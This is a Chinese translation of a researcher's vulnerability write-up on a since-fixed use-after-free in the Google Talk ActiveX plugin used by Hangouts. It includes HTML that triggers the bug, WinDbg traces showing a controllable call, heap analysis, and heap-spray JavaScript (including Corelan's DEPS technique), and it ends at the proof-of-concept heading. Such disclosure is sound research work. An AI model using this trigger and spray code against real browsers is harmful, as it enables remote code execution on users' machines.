# 【漏洞分析】Google Hangouts ActiveX中的释放重引用漏洞

阅读量 **120405**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-02-07 11:03:00

 **x**

##### 译文声明

本文是翻译文章，文章来源：pwnanisec.blogspot.be

原文地址：<http://pwnanisec.blogspot.be/2017/02/use-after-free-in-google-hangouts.html>

译文仅供参考，具体内容表达以及含义原文为准。

****

翻译：[胖胖秦](http://bobao.360.cn/member/contribute?uid=353915284)

预估稿费：180RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**概要**

在2015年，我发现了Google Hangouts使用的“Google Talk ActiveX插件”中存在释放重引用漏洞。

ActiveX是站点锁定的，这意味着它只能被Google的白名单域调用。要利用这一点，攻击者需要在这些域上触发一个XSS错误。

该错误已报告给Google，此后已修复。

  

**ActiveX详细信息**

在IE上安装Google Hangouts时，系统会安装“Google Talk ActiveX Plugin”控件。这个控件由浏览器调用并导出5个方法。

    
    
    dispinterface GTalkPluginInterface {
        properties：
        methods：
            [id（0x60020000）]
            void send（in in BSTR str）;
            [id（0x60020001），propput]
            void onmessage（[in] VARIANT * rhs）;
            [id（0x60020002），propget]
            BSTR version（）;
            [id（0x60020003），propget]
            BSTR wsconnectinfo（）;
            [id（0x60020004）]
            void wsconnectfailed（[in] int port）;
    };

控件没有实现IObjectSafetySiteLock接口来将ActiveX锁定到某些域。

    
    
     C:Program Files (x86)MicrosoftSiteLock 1.15>sitelist.exe {39125640-8D80-11DC-A2FE-C5C455D89593}  
     SiteList: Utility to dump domain list from a site-locked ActiveX control.  
     [1ff8] No bp log location saved, using default.  
     [000:000] [1ff8] Cpu: 6.58.9, x4, 2890Mhz, 8065MB  
     [000:000] [1ff8] Computer model: Not available  
     IObjectSafetySiteLock not implemented.

但是，测试显示ActiveX仅限于Google域。由于它不使用IObjectSafetySiteLock，我检查了它是否在Internet
Explorer中被注册为浏览器助手对象。这样它就可以接收navigation
事件。从调试和逆向应用程序来看，我注意到ActiveX注册为浏览器助手对象。它公开了IObjectWithSite接口,它会创建一个Internet
Explorer的连接点。通过这个，ActiveX可以获得正在使用的当前URL信息。

通过下面的C ++代码，我们创建对象的实例，并在IObjec tWithSite-> SetSite（）之前创建一个断点。

    
    
     #include "stdafx.h"  
     #include "windows.h"  
     #include "OCIdl.h"  
     int _tmain(int argc, _TCHAR* argv[])  
     {  
          CoInitialize(NULL);   
          IUnknown *punk;  
          LPGUID pclsid;  
          HRESULT hr = NULL;  
          //{39125640-8D80-11DC-A2FE-C5 C4 55 D8 95 93}  
          static const GUID CLSID_GTALK = { 0x39125640, 0x8D80, 0x11DC, { 0xa2, 0xfe, 0xc5, 0xc4, 0x55, 0xd8, 0x95, 0x93 } };  
          if (FAILED(hr))  
         printf("error");  
          hr = CoCreateInstance(CLSID_GTALK, NULL, CLSCTX_SERVER,   
                   IID_IUnknown, (void **)&punk);  
       if (FAILED(hr))  
         printf("error");  
        // Ask the ActiveX object for the IDispatch interface.  
          IObjectWithSite *pOSite;  
            hr = punk->QueryInterface(IID_IObjectWithSite, (void **)&pOSite);  
       if (FAILED(hr))  
         printf("error");  
          __asm  
          {  
               int 3;  
          }  
          //pOSite->GetSite( CLSID_GTALK, NULL);  
          pOSite->SetSite(NULL);  
          return 0;  
     }

然后我们可以使用调试器来步入函数并获取其地址。然后我们在Internet Explorer中断此地址，并使用HTML代码加载和调用控件。

控件实现SetSite，它由IE传递的一个对象调用。下面的代码是实现的一部分。URL由ECX参数传递。

    
    
    0:007> u 5ca85c51  
     googletalkax+0x5c51:  
     5ca85c51 51       push  ecx  
     5ca85c52 50       push  eax  
     5ca85c53 e8d88f0000   call  googletalkax!DllUnregisterServer+0x39e0 (5ca8ec30)  
     5ca85c58 8bd8      mov   ebx,eax  
     5ca85c5a 83c408     add   esp,8  
     5ca85c5d 85db      test  ebx,ebx  
     5ca85c5f 7465      je   googletalkax+0x5cc6 (5ca85cc6)  
     5ca85c61 8b4e40     mov   ecx,dword ptr [esi+40h]  
     0:007> da poi(ecx)  
     1123efc0 "http://localhost:9000/testgoogle"  
     1123efe0 "talkactivexplugin.html"

通过该功能的深入了解，我们可以找到将当前域与列入白名单的域进行比较的代码。

    
    
     .text:5CA8CA20         cmp   [ebp+var_8], 10h  
     .text:5CA8CA24         lea   eax, [ebp+var_1C] ; holds the current domain name   
     .text:5CA8CA27         push  dword ptr [esi] ; holds whitelisted domain  
     .text:5CA8CA29         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CA2D         push  eax  
     .text:5CA8CA2E         call  sub_5CA957C0  
     .text:5CA8CA33         add   esp, 8  
     .text:5CA8CA36         test  al, al  
     .text:5CA8CA38         jnz   loc_5CA8CB37  
     .text:5CA8CA3E         add   esi, 4  
     .text:5CA8CA41         cmp   esi, offset aHostedtalkgadg ; "*hostedtalkgadget.google.com"  
     .text:5CA8CA47         jl   short loc_5CA8CA20

我们可以在调试器中使用断点来显示所有列入白名单的域。

    
    
     0:005> bl  
      0 e 5ca8ca2e   0001 (0001) 0:**** googletalkax!DllUnregisterServer+0x17de "da poi(esp+4);g"  
     0:005> g  
     5cace2c4 "*hostedtalkgadget.google.com"  
     5cace2e4 "*mail.google.com"  
     5cace2f8 "*plus.google.com"  
     5cace30c "*plus.sandbox.google.com"  
     5cace328 "*talk.google.com"  
     5cace33c "*talkgadget.google.com"

以下是函数中另一条不会被命中的代码路径。此代码需要在控件中设置“ plugin_enable_corp_host
”标记。这可能是由Google内部使用。然后对其他主机执行其他检查。

    
    
     .text:5CA8CA9F         push  offset a_corp_google_c ; "*.corp.google.com"  
     .text:5CA8CAA4         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAA8         push  eax  
     .text:5CA8CAA9         call  sub_5CA957C0  
     .text:5CA8CAAE         add   esp, 8  
     .text:5CA8CAB1         test  al, al  
     .text:5CA8CAB3         jnz   short loc_5CA8CB0C  
     .text:5CA8CAB5         cmp   [ebp+var_8], 10h  
     .text:5CA8CAB9         lea   eax, [ebp+var_1C]  
     .text:5CA8CABC         push  offset a_prod_google_c ; "*.prod.google.com"  
     .text:5CA8CAC1         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAC5         push  eax  
     .text:5CA8CAC6         call  sub_5CA957C0  
     .text:5CA8CACB         add   esp, 8  
     .text:5CA8CACE         test  al, al  
     .text:5CA8CAD0         jnz   short loc_5CA8CB0C  
     .text:5CA8CAD2         cmp   [ebp+var_8], 10h  
     .text:5CA8CAD6         lea   eax, [ebp+var_1C]  
     .text:5CA8CAD9         push  offset a_googlegoro_co ; "*.googlegoro.com"  
     .text:5CA8CADE         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAE2         push  eax  
     .text:5CA8CAE3         call  sub_5CA957C0  
     .text:5CA8CAE8         add   esp, 8  
     .text:5CA8CAEB         test  al, al  
     .text:5CA8CAED         jnz   short loc_5CA8CB0C  
     .text:5CA8CAEF         cmp   [ebp+var_8], 10h  
     .text:5CA8CAF3         lea   eax, [ebp+var_1C]  
     .text:5CA8CAF6         push  offset a_googleplex_co ; "*.googleplex.com"  
     .text:5CA8CAFB         cmovnb eax, [ebp+var_1C]  
     .text:5CA8CAFF         push  eax  
     .text:5CA8CB00         call  sub_5CA957C0

corp.google.com和googleplex.com返回登录提示，似乎仅供Google员工使用。

prod.google.com是一个不存在的域，可能是一个内部域。

  

**如何触发bug**

“onmessage”函数接收一个VARIANT，该VARIANT需要一个JavaScript回调函数，该函数由控件调用。这可以通过以下代码测试。

    
    
     <html>  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     <script>  
     sdr.onmessage = sdrcallback;  
     function sdrcallback(){  
          alert("callback function is called");  
     }  
     </script>  
     </html>

ActiveX控件中的回调函数可能会触发释放重引用漏洞。如果控件在调用回调函数之前没有调用AddRef（），则会发生这种情况。回调函数拥有对控件的引用,但控件并没有考虑这种情况。

我通过创建一个将删除控件的回调函数来测试这个场景。

    
    
     <html>  
     <div id="seandiv">  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     </div>  
     <script>  
     sdr.onmessage = sdrcallback;  
     function sdrcallback(){  
          alert("callback function is called");  
          //delete div  
          this.document.getElementById("seandiv").innerHTML = "";  
          CollectGarbage();  
          CollectGarbage();  
          CollectGarbage();  
     }  
     </script>  
     <body>  
     sdr  
     </body>  
     bp OLEAUT32!DispCallFunc "u poi(poi(poi(esp+4))+(poi(esp+8))) L1;gc"  
     </html>

我在调试器中遇到以下崩溃。

    
    
     (13b4.24a8): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:UsersSeanAppDataLocalGoogleGoogle Talk Plugingoogletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=0aabe8b7 edx=00161078 esi=00000000 edi=407a2fb0  
     eip=13e70ca5 esp=0a13c1b8 ebp=0a13c2cc iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:407a2fcc=????????

EDI寄存器指向无效的内存。

    
    
     0:008> r  
     eax=00000001 ebx=00000001 ecx=0aabe8b7 edx=00161078 esi=00000000 edi=407a2fb0  
     eip=13e70ca5 esp=0a13c1b8 ebp=0a13c2cc iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:407a2fcc=????????  
     0:008> dd edi  
     407a2fb0 ???????? ???????? ???????? ????????  
     407a2fc0 ???????? ???????? ???????? ????????  
     407a2fd0 ???????? ???????? ???????? ????????  
     407a2fe0 ???????? ???????? ???????? ????????  
     407a2ff0 ???????? ???????? ???????? ????????  
     407a3000 ???????? ???????? ???????? ????????  
     407a3010 ???????? ???????? ???????? ????????  
     407a3020 ???????? ???????? ???????? ????????

进一步的分析表明，它指向已释放的内存。

    
    
     0:008> !heap -p -a edi  
       address 407a2fb0 found in  
       _DPH_HEAP_ROOT @ 161000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       40751ccc:     407a2000       2000  
       51f990b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       13e88310 googletalkax!DllUnregisterServer+0x0001d9f0  
       13e6e407 googletalkax!DllUnregisterServer+0x00003ae7  
       13e6218a googletalkax+0x0000218a  
       13e6572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect<-1073475584>+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x000001ce

**测试利用**

下一步是检查错误的可利用性。我们需要用自己分配的内存替换释放的内存，看看数据是如何处理的，以测试它可以执行代码。

我用.dvalloc（<https://msdn.microsoft.com/en-us/library/windows/hardware/ff562434%28v=vs.85%29.aspx> ）来实现这一点。

我们看下面的代码，我们可以看到有一个路径导致代码执行。edi +
1ch指向的已释放内存放入EAX寄存器中。然后引用此内存，并将eax指向的数据放入ESI寄存器中。然后有一些其他操作和函数调用，之后调用ESI + 4。

    
    
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30      mov   esi,dword ptr [eax] ds:002b:00000000=????????  
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50       push  eax  
     13e70cb1 8d45e4     lea   eax,[ebp-1Ch]  
     13e70cb4 50       push  eax  
     13e70cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408     add   esp,8  
     13e70cc0 50       push  eax  
     13e70cc1 ff5604     call  dword ptr [esi+4]

我们需要确保函数调用不会改变ESI寄存器的值，以确保我们有一条代码执行的路径。下面的windbg会话显示我如何分配新的内存来替换释放的内存，并通过这段代码来确保这个路径可以执行代码。

    
    
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:UsersSeanAppDataLocalGoogleGoogle Talk Plugingoogletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=111e2fb0  
     eip=59d80ca5 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00010246  
     googletalkax!DllUnregisterServer+0x6385:  
     59d80ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:111e2fcc=????????  
     0:008> .dvalloc 2000h  
     Allocated 2000 bytes starting at 0c690000  
     0:008> r @edi = 0c690000  
     0:008> dd edi+1c  
     0c69001c 00000000 00000000 00000000 00000000  
     0c69002c 00000000 00000000 00000000 00000000  
     0c69003c 00000000 00000000 00000000 00000000  
     0c69004c 00000000 00000000 00000000 00000000  
     0c69005c 00000000 00000000 00000000 00000000  
     0c69006c 00000000 00000000 00000000 00000000  
     0c69007c 00000000 00000000 00000000 00000000  
     0c69008c 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=00000000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80ca8 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6388:  
     59d80ca8 8b30      mov   esi,dword ptr [eax] ds:002b:00000000=????????  
     0:008> .dvalloc 200  
     Allocated 1000 bytes starting at 0cbd0000  
     0:008> r @eax = 0cbd0000  
     0:008> dd eax  
     0cbd0000 00000000 00000000 00000000 00000000  
     0cbd0010 00000000 00000000 00000000 00000000  
     0cbd0020 00000000 00000000 00000000 00000000  
     0cbd0030 00000000 00000000 00000000 00000000  
     0cbd0040 00000000 00000000 00000000 00000000  
     0cbd0050 00000000 00000000 00000000 00000000  
     0cbd0060 00000000 00000000 00000000 00000000  
     0cbd0070 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=0cbd0000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80caa esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x638a:  
     59d80caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6390:  
     59d80cb0 50       push  eax  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6391:  
     59d80cb1 8d45e4     lea   eax,[ebp-1Ch]  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb4 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6394:  
     59d80cb4 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb5 esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6395:  
     59d80cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (59d89b30)  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cba esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639a:  
     59d80cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch] ds:002b:0c69001c=00000000  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cbd esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639d:  
     59d80cbd 83c408     add   esp,8  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a0:  
     59d80cc0 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a1:  
     59d80cc1 ff5604     call  dword ptr [esi+4]  ds:002b:00000004=????????  
     0:008> p  
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.

这表明，如果我们可以将释放的内存替换为我们自己分配的内存，我们可以把它转换为代码执行。

  

**堆分配分析**

在Gflags.exe中，我们启用“Create User Mode Stack Trace Database”。

我们需要在同一堆上分配相同块大小的内存，以便将其变成可利用的条件。首先，我们确定这个释放的内存分配在什么堆上。

我创建了以下HTML来通过IE在默认堆上喷射一些可控数据。

    
    
     <html>  
     <div id="seandiv">  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     </div>  
     <script>  
     function sdrcallback(){  
          alert("callback function is called");  
          //delete div  
          this.document.getElementById("seandiv").innerHTML = "";  
          CollectGarbage();  
          CollectGarbage();  
          CollectGarbage();  
          alert(sdr);  
     }  
     //javapscript heap spray to see if we are on same heap as activeX  
     var seanstring = "seansea"+"n7aaaaaaaaa"+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";  
     //s -u 0x00000000 L?0xffffffff seansean7  
     sdr.onmessage = sdrcallback;  
     </script>  
     <body></html>

我使用windbg来查看它分配的堆。

    
    
     (1348.18dc): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:UsersSeanAppDataLocalGoogleGoogle Talk Plugingoogletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=d215f8bc edx=00461078 esi=00000000 edi=3dc19fb0  
     eip=14d10ca5 esp=09b3bf10 ebp=09b3c024 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  
     14d10ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:3dc19fcc=????????  
     0:007> !heap -p -a edi  
       address 3dc19fb0 found in  
       _DPH_HEAP_ROOT @ 461000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       3dbe1ac4:     3dc19000       2000  
       5f8290b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       14d28310 googletalkax!DllUnregisterServer+0x0001d9f0  
       14d0e407 googletalkax!DllUnregisterServer+0x00003ae7  
       14d0218a googletalkax+0x0000218a  
       14d0572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect<-1073475584>+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x000001ce  
     0:007> s -u 0x00000000 L?0xffffffff seansean7  
     0eebafa6 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     29e66f96 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     4b6c6f02 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     79700c0a 0073 0065 0061 006e 0073 0065 0061 006e s.e.a.n.s.e.a.n.  
     0:007> !heap -p -a 0eebafa6  
       address 0eebafa6 found in  
       _DPH_HEAP_ROOT @ 461000  
       in busy allocation ( DPH_HEAP_BLOCK:     UserAddr     UserSize -     VirtAddr     VirtSize)  
                      eec0208:     eeba7f0       80c -     eeba000       2000  
       5f828e89 verifier!AVrfDebugPageHeapAllocate+0x00000229  
       77690d96 ntdll!RtlDebugAllocateHeap+0x00000030  
       7764af0d ntdll!RtlpAllocateHeap+0x000000c4  
       775f3cfe ntdll!RtlAllocateHeap+0x0000023a  
       61df38ff MSHTML!CHtmRootParseCtx::NailDownChain+0x000004ba  
       61de7c59 MSHTML!CHtmRootParseCtx::EndElement+0x00000119  
       61de7b27 MSHTML!CHtmRootParseCtxRouter::EndElement+0x00000017  
       61dee7b2 MSHTML!CHtml5TreeConstructor::PopElement+0x000000b7  
       61f896b5 MSHTML!CTextInsertionMode::DefaultEndElementHandler+0x00000035  
       620fc85b MSHTML!CInsertionMode::HandleEndElementToken+0x0000003d  
       61df17f5 MSHTML!CHtml5TreeConstructor::HandleElementTokenInInsertionMode+0x00000026  
       61df16c8 MSHTML!CHtml5TreeConstructor::PushElementToken+0x000000a5  
       61f891f8 MSHTML!CHtml5Tokenizer::EmitElementToken+0x00000067  
       61f8a243 MSHTML!CHtml5Tokenizer::RCDATAEndTagName_StateHandler+0x000003bf  
       61deeec5 MSHTML!CHtml5Tokenizer::ParseBuffer+0x0000012c  
       61def19b MSHTML!CHtml5Parse::ParseToken+0x00000131  
       61dee707 MSHTML!CHtmPost::ProcessTokens+0x000006af  
       61de7f32 MSHTML!CHtmPost::Exec+0x000001e4  
       620b9a78 MSHTML!CHtmPost::Run+0x0000003d  
       620b99de MSHTML!PostManExecute+0x00000061  
       620c1e04 MSHTML!PostManResume+0x0000007b  
       61e4d397 MSHTML!CDwnChan::OnMethodCall+0x0000003e  
       61d0e101 MSHTML!GlobalWndOnMethodCall+0x0000016d  
       61d0db16 MSHTML!GlobalWndProc+0x000002e5  
       751262fa user32!InternalCallWinProc+0x00000023  
       75126d3a user32!UserCallWinProcCheckWow+0x00000109  
       751277c4 user32!DispatchMessageWorker+0x000003bc  
       7512788a user32!DispatchMessageW+0x0000000f  
       6366f668 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000464  
       636a25b8 IEFRAME!LCIETab_ThreadProc+0x0000037b  
       7531d6fc iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000001c  
       5f893991 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000094

我们现在知道，ActiveX控件和Javascript使用相同的Heap，这是一个好消息。

  

**确定分配大小**

现在我们已经确认控件和JavaScript使用相同的堆，我们需要确定释放对象的分配大小。

为此，我们需要禁用所有gflags设置，除了usermode stack dbs。

我们还需要在它崩溃的地址下断点。

    
    
    bu googletalkax！DllUnregisterServer + 0x6385“！heap -p -a edi; g”
     70760ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:078f8a44=a48a8f07  
     0:005> !heap -p -a edi  
       address 078f8a28 found in  
       _HEAP @ 730000  
        HEAP_ENTRY Size Prev Flags  UserPtr UserSize - state  
         078f8a10 000d 0000 [00]  078f8a28  00050 - (busy)  
          ? googletalkax!DllUnregisterServer+43db0

从这里我们可以看到释放的对象的大小是0x50字节。

  

**堆喷射**

下一步是在与对象交互之前,使用堆喷射来覆盖已被释放的内存。为此，我们首先在Internet
Explorer中初始化低碎片堆。我们申请分配大量相同大小的块来进行堆喷射。

我们通过以下JavaScript函数来实现。这将创建一个0x50字节的子字符串,减去用于BSTR对象的4字节对象头，减去unicode字符串的2个终止NULL字节。因为该值存储为Unicode字符串，所以此值将除以2。最后,字符串将在内存中保持正确的0x50字节。

    
    
     var largechunk = unescape("sean3");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length < 0x10000) largechunk += largechunk;  
          for (var i = 0; i < 0x200; i++)  
          {  
               spray[i] = largechunk.substring(0,(0x50-6)/2);  
          }  
     }

我们可以使用Corelan的DEPS喷射技术来实现精准的喷射。
（<https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/> ）。

这将喷射堆，并在0x20302228内存地址保存我们的数据。

    
    
     function corelan_deps_spray()  
     {  
          var div_container = document.getElementById("corelanspraydiv");  
          div_container.style.cssText = "display:none";  
          junk = unescape("%u615d%u6161");  
          while (junk.length < 0x80000) junk += junk;  
          for (var i = 0; i < 0x500; i++)  
          {  
               var obj = document.createElement("button");  
               obj.title = junk;  
               div_container.appendChild(obj);  
          }  
     }

**概念证明**

